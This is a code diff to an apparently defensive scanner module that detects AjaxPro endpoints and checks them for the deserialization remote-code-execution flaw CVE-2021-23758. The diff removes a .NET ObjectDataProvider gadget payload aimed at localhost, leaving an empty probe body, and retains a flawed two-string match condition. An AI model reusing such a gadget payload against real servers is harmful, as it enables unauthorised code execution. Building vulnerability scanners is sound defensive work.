@@ -25,7 +25,6 @@ class ajaxpro(BaseModule):
             await self.check_http_response_event(event)
 
     async def check_url_event(self, event):
-        """Handle URL events to detect Ajaxpro vulnerabilities."""
         for stem in ["ajax", "ajaxpro"]:
             probe_url = f"{event.data}{stem}/whatever.ashx"
             probe = await self.helpers.request(probe_url)
@@ -37,7 +36,6 @@ class ajaxpro(BaseModule):
                     await self.confirm_exploitability(probe_url, event)
 
     async def check_http_response_event(self, event):
-        """Handle HTTP response events to detect Ajaxpro vulnerabilities."""
         resp_body = event.data.get("body")
         if resp_body:
             match = await self.helpers.re.search(self.ajaxpro_regex, resp_body)
@@ -47,19 +45,20 @@ class ajaxpro(BaseModule):
                 await self.confirm_exploitability(ajaxpro_path, event)
 
     async def emit_technology(self, event, detection_url):
+        url = event.data if event.type == "URL" else event.data["url"]
         await self.emit_event(
             {
                 "host": str(event.host),
-                "url": event.data if event.type == "URL" else event.data["url"],
+                "url": url,
                 "technology": "ajaxpro",
             },
             "TECHNOLOGY",
             event,
-            context=f"{self.meta['description']} discovered Ajaxpro instance ({event.type}) at {detection_url}",
+            context=f"{self.meta['description']} discovered Ajaxpro instance ({event.type}) at {url} with trigger {detection_url}",
         )
 
+    # Confirm exploitability of the detected Ajaxpro instance
     async def confirm_exploitability(self, detection_url, event):
-        """Confirm exploitability of the detected Ajaxpro instance."""
         self.debug("Ajaxpro detected, attempting to confirm exploitability")
         parsed_url = urlparse(detection_url)
         base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
@@ -67,32 +66,20 @@ class ajaxpro(BaseModule):
         full_url = f"{base_url}{path}/AjaxPro.Services.ICartService,AjaxPro.2.ashx"
 
         # Payload and headers defined inline
-        payload = {
-            "item": {
-                "__type": "System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
-                "MethodName": "Send",
-                "ObjectInstance": {
-                    "__type": "WinHttp.WinHttpRequest.5.1, Interop.WinHttpRequest, Version=5.1.2600.2180, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a",
-                    "Open": {
-                        "Method": "GET",
-                        "Url": "http://localhost",
-                        "Async": False,
-                    },
-                },
-            },
-        }
+        payload = {}
         headers = {"X-Ajaxpro-Method": "AddItem"}
 
         probe_response = await self.helpers.request(full_url, method="POST", headers=headers, json=payload)
-        if "AjaxPro.Services.ICartService" and "MissingMethodException" in probe_response.text:
-            await self.emit_event(
-                {
-                    "host": str(event.host),
-                    "severity": "CRITICAL",
-                    "url": event.data if event.type == "URL" else event.data["url"],
-                    "description": f"Ajaxpro Deserialization RCE (CVE-2021-23758) Trigger: [{full_url}]",
-                },
-                "VULNERABILITY",
-                event,
-                context=f"{self.meta['description']} discovered Ajaxpro instance ({event.type}) at {detection_url}",
-            )
+        if probe_response:
+            if "AjaxPro.Services.ICartService" and "MissingMethodException" in probe_response.text:
+                await self.emit_event(
+                    {
+                        "host": str(event.host),
+                        "severity": "CRITICAL",
+                        "url": event.data if event.type == "URL" else event.data["url"],
+                        "description": f"Ajaxpro Deserialization RCE (CVE-2021-23758) Trigger: [{full_url}]",
+                    },
+                    "VULNERABILITY",
+                    event,
+                    context=f"{self.meta['description']} discovered Ajaxpro instance ({event.type}) at {detection_url}",
+                )
